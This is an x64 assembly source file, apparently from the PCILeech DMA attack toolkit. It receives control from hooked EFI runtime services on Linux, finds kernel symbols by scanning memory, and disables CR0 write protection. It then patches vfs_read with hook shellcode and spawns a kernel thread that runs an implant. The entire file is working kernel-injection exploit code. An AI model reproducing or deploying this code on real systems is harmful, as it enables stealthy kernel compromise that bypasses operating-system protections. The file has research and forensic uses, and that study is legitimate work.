; lx64_stage2_efi.asm : assembly to receive execution from hooked efi runtime services dispatch table.
; Compatible with Linux x64.
;
; (c) Ulf Frisk, 2017
; Author: Ulf Frisk, pcileech@frizk.net
;

;
; the efi runtime services hook will access the linux kernel proper and set up
; a hook in the 'vfs_read' function. The 'vfs_read' function gets called often.
; A harmless kernel Oops will be shown in the process when setting a unaligned
; memory page to executable.
;

.CODE

data_reserved_future_use	dq 0,0,0,0							; [000h offset, 20h size]
data_phys_addr_alloc		dd 0								; [020h offset, 04h size]
data_filler_0				dd 0								; [024h offset, 04h size]
data_addr_runtserv			dq 0								; [028h offset, 08h size]
data_runtserv_table_fn		dq 0,0,0,0,0,0,0,0,0,0,0,0,0,0		; [030h offset, 70h size]
data_debug0					dq 0								; [0a0h offset, 08h size]
data_debug1					dq 0								; [0a8h offset, 08h size]
data_debug2					dq 0								; [0b0h offset, 08h size]
data_debug3					dq 0								; [0b8h offset, 08h size]
addr_vmemmap_base			dq 0								; [0c0h offset, 08h size]
addr_kthread_create_on_node	dq 0								; [0c8h offset, 08h size]
addr_wake_up_process		dq 0								; [0d0h offset, 08h size]
addr_page_offset_base		dq 0								; [0d8h offset, 08h size]
addr_alloc_pages_current	dq 0								; [0e0h offset, 08h size]
addr_set_memory_x			dq 0								; [0e8h offset, 08h size]
addr_vfs_read				dq 0								; [0f0h offset, 08h size]
addr_kallsyms_lookup_name	dq 0								; [0f8h offset, 08h size]

; ----------------------------------------------------
; ENTRY POINT:
; 100h offset
; UEFI x64 calling convention is assumed upon entry.
; volatile :: rax, rcx, rdx, r8, r9, r10, r11
; arguments in :: rcx, rdx, r8, r9
; ----------------------------------------------------
main PROC
	; ----------------------------------------------------
	; 1: LANDING POINT FOR HOOKED EFI RUNTIME SERVICES (RUNTSERV) TABLE.
	;    (depending on which of the _14_ functions are hooked execution
	;    will land on different position.
	; ----------------------------------------------------
	PUSH 0
	PUSH 0
	PUSH 0
	PUSH 0
	PUSH 0
	PUSH 0
	PUSH 0
	PUSH 0
	PUSH 0
	PUSH 0
	PUSH 0
	PUSH 0
	PUSH 0
	PUSH 0
	; ----------------------------------------------------
	; 2: FETCH CALLER AND CALLEE ADDRESSES.
	; ----------------------------------------------------
	MOV r11, 14
	loop_count:
	DEC r11
	POP rax
	TEST rax, rax
	JZ loop_count
	PUSH rax
	MOV r10, rax
	LEA rax, data_runtserv_table_fn
	PUSH [rax + 8*r11 + 8]
	; ----------------------------------------------------
	; 3: SAVE ORIGINAL PARAMETERS.
	; ----------------------------------------------------
	PUSH rdi
	PUSH rsi
	PUSH rcx
	PUSH rdx
	PUSH r8
	PUSH r9
	PUSH rbx
	PUSH rbp
	PUSH r12
	PUSH r13
	PUSH r14
	PUSH r15
	; ----------------------------------------------------
	; 4: RESTORE ORIGNAL RUNTSERV TABLE.
	; ----------------------------------------------------
	MOV rcx, 14
	loop_restore:
	DEC rcx
	LEA rax, data_runtserv_table_fn
	MOV rdx, [rax + 8*rcx]
	MOV rax, [data_addr_runtserv]
	MOV [rax + 18h + 8*rcx], rdx
	TEST rcx, rcx
	JNZ loop_restore
	; ----------------------------------------------------
	; 5: FIND SYMBOLS AND CALL SETUP CODE.
	; ----------------------------------------------------
	MOV rcx, r10
	CALL find_kallsyms
	CALL find_symbols
	CALL setup_uefi_rt
	; ----------------------------------------------------
	; 6: RESTORE AND JMP TO ORIGINAL INTENDED TARGET.
	; ----------------------------------------------------
	POP r15
	POP r14
	POP r13
	POP r12
	POP rbp
	POP rbx
	POP r9
	POP r8
	POP rdx
	POP rcx
	POP rsi
	POP rdi
	POP rax
	MOV [data_debug1], rax
	JMP rax
main ENDP

; ----------------------------------------------------
; Locate address of kallsyms_lookup_name.
; rcx -> address in kernel
; volatile :: rax, r13, r14, r15
; ----------------------------------------------------
find_kallsyms PROC
	; ----------------------------------------------------
	; 1: Search for string: 'kallsyms_lookup_name'.
	; ----------------------------------------------------
	LEA rax, str_kallsyms
	MOV r13, [rax]
	MOV r14, [rax+8]
	MOV r15, [rax+14]
	kallsyms_find_str_loop:
	INC rcx
	MOV rax, [rcx]
	CMP rax, r13
	JNE kallsyms_find_str_loop
	MOV rax, [rcx+8]
	CMP rax, r14
	JNE kallsyms_find_str_loop
	MOV rax, [rcx+16-2]
	CMP rax, r15
	JNE kallsyms_find_str_loop
	INC rcx
	; ----------------------------------------------------
	; 2: Search for address to string previously found.
	; ----------------------------------------------------
	; rcx == address of str kallsyms_lookup_name -> r15
	MOV r15, rcx
	SHR rcx, 3
	SHL rcx, 3
	kallsyms_find_addr_loop:
	SUB rcx, 8
	MOV rax, [rcx]
	CMP rax, r15
	JNZ kallsyms_find_addr_loop
	; ----------------------------------------------------
	; 3: Return fn address of kallsyms_lookup_name.
	; ----------------------------------------------------
	MOV rax, [rcx-08h]
	MOV [addr_kallsyms_lookup_name], rax
	RET
find_kallsyms ENDP

; ----------------------------------------------------
; Locate required symbols (kallsyms_lookup_name must be known).
; volatile :: rax, rdi
; ----------------------------------------------------
find_symbols PROC
	PUSH r15
	MOV r15, [addr_kallsyms_lookup_name]
	; addr_vfs_read
	LEA rdi, str_vfs_read
	CALL r15
	MOV [addr_vfs_read], rax
	; addr_set_memory_x
	LEA rdi, str_set_memory_x
	CALL r15
	MOV [addr_set_memory_x], rax
	; addr_alloc_pages_current
	LEA rdi, str_alloc_pages_current
	CALL r15
	MOV [addr_alloc_pages_current], rax
	; addr_page_offset_base
	LEA rdi, str_page_offset_base
	CALL r15
	MOV [addr_page_offset_base], rax
	; addr_vmemmap_base
	LEA rdi, str_vmemmap_base
	CALL r15
	MOV [addr_vmemmap_base], rax
	; addr_kthread_create_on_node
	LEA rdi, str_kthread_create_on_node
	CALL r15
	MOV [addr_kthread_create_on_node], rax
	; addr_wake_up_process
	LEA rdi, str_wake_up_process
	CALL r15
	MOV [addr_wake_up_process], rax
	POP r15
	RET
find_symbols ENDP

; ----------------------------------------------------
; Setup stage2 area and hook kernel proper.
; r14 -> address of kallsyms_lookup_name
; r11 :: address of vfs_read (virt addr/hook fn)
; r12 :: alloc pg (virt addr)
; r13 :: alloc pg (phys addr)
; ----------------------------------------------------
setup_uefi_rt PROC
	; ----------------------------------------------------
	; 1: ALLOC 1 PAGE FOR CODE TO BE CALLED BY KERNEL.
	; ----------------------------------------------------
	MOV rdi, 14h
	MOV rsi, 0h
	CALL [addr_alloc_pages_current]
	; ----------------------------------------------------
	; 2: RETRIEVE PHYS/VIRT ADDRESSES OF PAGE.
	; ----------------------------------------------------
	MOV rdi, rax
	CALL m_page_to_phys
	MOV r13, rax
	MOV rdi, r13
	CALL m_phys_to_virt
	MOV r12, rax
	MOV [data_debug1], r13		; debug
	MOV [data_debug2], r12		; debug
	; ----------------------------------------------------
	; 3: PATCH HOOK SHELLCODE.
	; ----------------------------------------------------
	; patch shellcode absolute virtual location
	LEA rax, hook_shellcode + 06h
	LEA rdx, hook_kernel_fn_landing_point
	AND rdx, 0fffh
	ADD rdx, r12
	MOV [rax], rdx
	; patch relative addr to set_memory_x
	MOV rdx, [addr_vfs_read]		; addr from
	ADD rdx, 19h
	MOV rcx, [addr_set_memory_x]	; addr to
	SUB ecx, edx					; addr rel (used in call)
	LEA rax, hook_shellcode + 15h
	MOV [rax], ecx
	; ----------------------------------------------------
	; 4: SAVE ORIGINAL BYTES OF HOOK FUNCTION.
	; ----------------------------------------------------
	XOR rcx, rcx
	MOV r8, [addr_vfs_read]
	LEA r9, data_hook_original_32
	hook_fn_copy_loop:
	MOV rax, [r8 + rcx]
	MOV [r9 + rcx], rax
	ADD rcx, 8
	CMP rcx, 32
	JNE hook_fn_copy_loop
	; ----------------------------------------------------
	; 5: COPY PAGE TO ALLOC'ED LOCATION.
	; ----------------------------------------------------
	XOR rcx, rcx
	LEA r8, main
	SHR r8, 12
	SHL r8, 12
	page_copy_loop:
	MOV rax, [r8 + rcx]
	MOV [r12 + rcx], rax
	ADD rcx, 8
	CMP rcx, 1000h
	JNE page_copy_loop
	; ----------------------------------------------------
	; 5: ENABLE SUPERVISOR WRITE.
	; ----------------------------------------------------
	MOV rax, cr0
	MOV r15, rax
	AND eax, 0fffeffffh
	MOV cr0, rax
	; ----------------------------------------------------
	; 6: PATCH KERNEL 'vfs_read'.
	; ----------------------------------------------------
	XOR rcx, rcx
	MOV r8, [addr_vfs_read]
	LEA r9, hook_shellcode
	hook_fn_patch_loop:
	MOV rax, [r9 + rcx]
	MOV [r8 + rcx], rax
	ADD rcx, 8
	CMP rcx, 32
	JNE hook_fn_patch_loop
	; ----------------------------------------------------
	; 7: CLEAN UP AND EXIT.
	; ----------------------------------------------------
	MOV cr0, r15
	MOV [data_phys_addr_alloc], r13d
	RET
setup_uefi_rt ENDP

; ------------------------------------------------------------------
; Retrieve the PAGE_OFFSET_BASE
; r14 -> kallsyms_lookup_name
; rax <- value of PAGE_OFFSET_BASE
; ------------------------------------------------------------------
m_page_offset_base PROC
	MOV rax, [addr_page_offset_base]
	TEST rax, rax
	JZ kaslr_pg_disable
	MOV rax, [rax]
	RET
	kaslr_pg_disable:
	MOV rax, 0ffff880000000000h
	RET
m_page_offset_base ENDP

m_phys_to_virt PROC
	PUSH rdi
	CALL m_page_offset_base
	POP rdi
	ADD rax, rdi
	RET
m_phys_to_virt ENDP

m_vmemmap_base PROC
	MOV rax, [addr_vmemmap_base]
	TEST rax, rax
	JZ kaslr_memmap_disable
	MOV rax, [rax]
	RET
	kaslr_memmap_disable:
	MOV rax, 0ffffea0000000000h
	RET
m_vmemmap_base ENDP

m_page_to_phys PROC
	PUSH rdi
	CALL m_vmemmap_base
	POP rdi
	SUB rdi, rax
	SHR rdi, 7		; PFN
	SHL rdi, 12
	MOV rax, rdi
	RET
m_page_to_phys ENDP

str_kallsyms				db 0, 'kallsyms_lookup_name', 0
str_kthread_create_on_node	db 'kthread_create_on_node', 0
str_alloc_pages_current		db 'alloc_pages_current', 0
str_page_offset_base		db 'page_offset_base', 0
str_vmemmap_base			db 'vmemmap_base', 0
str_vfs_read				db 'vfs_read', 0
str_set_memory_x			db 'set_memory_x', 0
str_wake_up_process			db 'wake_up_process', 0
str_pcileech				db 'pcileech', 0
data_cmpxchg_flag			db 0
data_hook_original_32		dq 0, 0, 0, 0

; ------------------------------------------------------------------
; Hook shellcode (26 bytes) to replace initial bytes of hooked
; function (vfs_read). First call set_memory_x to make target
; executable and then call into target.
; ------------------------------------------------------------------
hook_shellcode PROC
	; push 'vfs_read' 4 args to stack.
	PUSH rdi						; 00 offset, 01 size
	PUSH rsi						; 01 offset, 01 size
	PUSH rdx						; 02 offset, 01 size
	PUSH rcx						; 03 offset, 01 size
	MOV rdi, 8888888888888888h		; 04 offset, 0a size, 06 data_offset
	PUSH rdi						; 0e offset, 01 size (RET address for returning set_memory_x)
	MOV esi, 1						; 0f offset, 05 size
	JMP label_fake + 77777777h		; 14 offset, 05 size, 15 data_offset (call to set_memory_x)
	label_fake:
hook_shellcode ENDP

; -----------------------------------------------------------------------------
; CODE EXECUTED BY 'vfs_read' KERNEL HOOK BELOW
; -----------------------------------------------------------------------------
hook_kernel_fn_landing_point PROC
	; ----------------------------------------------------
	; 1: SAVE ORIGINAL PARAMETERS
	; ----------------------------------------------------
	;PUSH rdi		; already pushed by hook shellcode
	;PUSH rsi		; already pushed by hook shellcode
	;PUSH rdx		; already pushed by hook shellcode
	;PUSH rcx		; already pushed by hook shellcode
	PUSH r8
	PUSH r9
	PUSH rbx
	PUSH rbp
	PUSH r12
	PUSH r13
	PUSH r14
	PUSH r15
	; ----------------------------------------------------
	; 2: ENABLE SUPERVISOR WRITE
	; ----------------------------------------------------
	MOV rdx, cr0
	MOV rax, rdx
	AND eax, 0fffeffffh
	MOV cr0, rax
	; ----------------------------------------------------
	; 3: RESTORE ORIGNAL (32 bytes) & SUPERVISOR WRITE
	; ----------------------------------------------------
	XOR rcx, rcx
	MOV r8, [addr_vfs_read]
	LEA r9, data_hook_original_32
	hook_fn_copy_loop:
	MOV rax, [r9 + rcx]
	MOV [r8 + rcx], rax
	ADD rcx, 8
	CMP rcx, 32
	JNE hook_fn_copy_loop
	MOV cr0, rdx
	; ----------------------------------------------------
	; 4: ENSURE ATOMICITY IN THREADED ENVIRONMENTS
	; ----------------------------------------------------
	MOV al, 00h
	MOV dl, 01h
	LEA rcx, data_cmpxchg_flag
	LOCK CMPXCHG [rcx], dl
	JNE skipcall
	; ----------------------------------------------------
	; 5: CALL SETUP STAGE3 CODE
	; ----------------------------------------------------
	CALL setup_stage3
	; ----------------------------------------------------
	; 6: RESTORE AND JMP BACK TO UNHOOKED FUNCTION
	; ----------------------------------------------------
	skipcall:
	POP r15
	POP r14
	POP r13
	POP r12
	POP rbp
	POP rbx
	POP r9
	POP r8
	POP rcx
	POP rdx
	POP rsi
	POP rdi
	JMP [addr_vfs_read]
hook_kernel_fn_landing_point ENDP

; ----------------------------------------------------
; This code compiles into 53 bytes. This is copied by
; stage3 area by the setup function.
; Linux cannot use the simpler windows stage3 pre code
; since the thread will get stuck without a sleep.
; ----------------------------------------------------
lx64_stage3_pre PROC
	label_main_base:	
	JMP label_main_loop
	str_msleep db 'msleep', 0
	label_main_loop:
	LEA rdi, str_msleep
	LEA rax, label_main_base-1000h+10h		; KMDDATA.qwAddrKallsymsLookupName
	MOV rax, [rax]
	CALL rax
	MOV rdi, 100
	CALL rax
	LEA rax, label_main_base-8h
	MOV rax, [rax]
	CMP rax, 0
	JZ label_main_loop
lx64_stage3_pre ENDP

; ----------------------------------------------------
; clear_8k
; clear 8192 bytes of memory
; rdi -> starting address
; ----------------------------------------------------
clear_8k PROC
	XOR rax, rax
	MOV ecx, 1024
	CLD
	REP STOSQ [rdi]
	RET
clear_8k ENDP

setup_stage3 PROC
	; ----------------------------------------------------
	; 1: ALLOC PAGES.
	; ----------------------------------------------------
	MOV rdi, 14h
	MOV rsi, 2h
	CALL [addr_alloc_pages_current]
	; ----------------------------------------------------
	; 2: RETRIEVE PHYS/VIRT ADDRESSES OF PAGES.
	; ----------------------------------------------------
	MOV rdi, rax
	CALL m_page_to_phys
	MOV r13, rax
	MOV rdi, r13
	CALL m_phys_to_virt
	MOV r12, rax
	; ----------------------------------------------------
	; 3: SET CODE PAGE TO EXECUTABLE.
	; ----------------------------------------------------
	MOV rdi, r12
	MOV rsi, 2
	CALL [addr_set_memory_x]
	; ----------------------------------------------------
	; 4: CLEAR AND COPY STAGE3 PRE BINARY TO AREA.
	; ----------------------------------------------------
	MOV rdi, r12
	CALL clear_8k
	MOV rdi, 64
	copy_stage3_pre_loop:
	SUB rdi, 8
	LEA rax, lx64_stage3_pre
	MOV rax, [rax+rdi]
	MOV rsi, r12
	ADD rsi, 1000h
	ADD rsi, rdi
	MOV [rsi], rax
	TEST rdi, rdi
	JNZ copy_stage3_pre_loop
	; ----------------------------------------------------
	; 5: CREATE THREAD & SET UP DATA AREA.
	; ----------------------------------------------------
	MOV rdi, r12
	ADD rdi, 01000h
	XOR rsi, rsi
	XOR rdx, rdx
	SUB rdx, 1
	LEA rcx, str_pcileech
	CALL [addr_kthread_create_on_node]
	MOV [r12+58h], rax   ; KMDDATA.ReservedKMD
	MOV rax, [addr_kallsyms_lookup_name]
	MOV [r12+10h], rax   ; KMDDATA.AddrKallsymsLookupName
	; ----------------------------------------------------
	; 6: START THREAD.
	; ----------------------------------------------------
	MOV rdi, [r12+58h]
	CALL [addr_wake_up_process]
	; ----------------------------------------------------
	; 7: FINISH!
	; ----------------------------------------------------
	MOV [data_phys_addr_alloc], r13d
	RET
setup_stage3 ENDP

END
